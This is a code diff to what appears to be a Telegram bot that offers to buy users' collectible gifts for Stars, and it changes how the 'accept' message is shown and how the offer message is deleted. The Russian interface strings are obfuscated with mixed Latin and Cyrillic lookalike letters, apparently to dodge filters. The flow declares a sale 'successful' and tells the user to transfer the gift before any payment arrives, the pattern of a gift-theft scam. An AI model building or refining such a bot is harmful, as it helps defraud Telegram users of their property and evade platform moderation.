@@ -73,7 +73,7 @@ TEXTS = {
         "offer_for": "зa кoллeкционный пpедмeт",
         "offer_time": "Пpeдложeние дeйствyет eще 5 ч. 59 мин..",
         "offer_fix": "Сдeлкa фикcиpуeтcя кнoпкoй «Пpинять».",
-        "accept_ok": "{gift} Успешно продан!",
+        "accept_ok": "Успешно продан!",
         "accept_give": "• Пepeдaйтe пoкyпaтeлю для зaчиcлeния Ѕtarѕ.",
         "accept_then": "Зaтeм нaжмитe «Пoдтвepдить пepeдaчy».",
         "accept_warn": "Кнoпкa cpaбoтaeт тoлькo ecли пoдapoк yжe y пoлyчaтeля.",
@@ -248,7 +248,7 @@ def build_offer_text(amount, currency, gift_name, gift_num, lang):
 
 def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
     return (
-        f'{em(E_CHECK, "✅")} <b>{T(lang, "accept_ok")}</b>\n\n'
+        f'{em(E_CHECK, "✅")} {gift_link_bold(gift_name, gift_num, lang)} <b>{T(lang, "accept_ok")}</b>\n\n'
         f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
         f'{T(lang, "accept_then")}\n'
         f'{T(lang, "accept_warn")}\n\n'
@@ -410,14 +410,34 @@ async def accept(cb: CallbackQuery):
     order_id = gen_order_id()
     text = build_accept_text(amount, currency, gift_name, gift_num, order_id, lang)
 
+    bcid = cb.message.business_connection_id if cb.message else None
+
+    # удаляем офферное сообщение
     try:
-        await cb.message.edit_text(
+        if bcid:
+            await bot.delete_business_messages(
+                business_connection_id=bcid,
+                message_ids=[cb.message.message_id],
+            )
+        else:
+            await cb.message.delete()
+    except Exception as e:
+        logging.warning(f"delete offer error: {e}")
+
+    # шлём accept-сообщение новым (появится снизу чата)
+    try:
+        send_kwargs = dict(
+            chat_id=cb.message.chat.id,
             text=text,
             reply_markup=make_accept_keyboard(gift_name, gift_num, lang),
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
+        if bcid:
+            send_kwargs["business_connection_id"] = bcid
+        await bot.send_message(**send_kwargs)
     except Exception as e:
-        logging.error(f"accept edit error: {e}")
-        await cb.answer("Не удалось обновить", show_alert=True)
+        logging.error(f"accept send error: {e}")
+        await cb.answer("Не удалось отправить", show_alert=True)
         return
 
     await cb.answer()
